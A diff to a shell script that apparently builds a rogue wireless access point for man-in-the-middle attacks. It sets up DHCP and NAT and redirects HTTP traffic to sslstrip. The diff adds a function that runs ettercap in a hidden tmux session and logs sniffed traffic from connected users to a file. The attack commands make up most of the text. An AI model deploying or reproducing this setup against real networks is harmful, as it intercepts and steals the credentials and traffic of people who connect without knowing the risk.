@@ -24,11 +24,13 @@ function SetupDHCP(){
 	ip addr add 192.168.1.1/24 dev $WlanInterface # arbitrary address
 	sysctl net.ipv4.ip_forward=1
 	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
 	iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayIp
-	iptables -P FORWARD ACCEPT
+	iptables -t nat -A POSTROUTING -o $internetInterface -j MASQUERADE
+	iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
 	iptables -A FORWARD -i $WlanInterface -j ACCEPT
 	
-	iptables -t nat -A POSTROUTING -o $internetInterface -j MASQUERADE
+	
 	iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
 	dhcpd -cf ./dhcpd.conf -pf /var/run/dhcpd.pid $WlanInterface
@@ -38,7 +40,13 @@ function SetupDHCP(){
 function StartSSLstrip(){
 	tmux new-session -d -s SSLstrip 'sslstrip -f -p -k 10000'
 	tmux detach -s SSLstrip
+	StartEtterCap
 }
+function StartEtterCap(){
+	tmux new-session -d -s EtterCap 'ettercap -p -u -T -q -i $WlanInterface >> /home/alarm/OutputEttercap.txt'
+	tmux detach -s EtterCap
+}
+
 
 #script
 
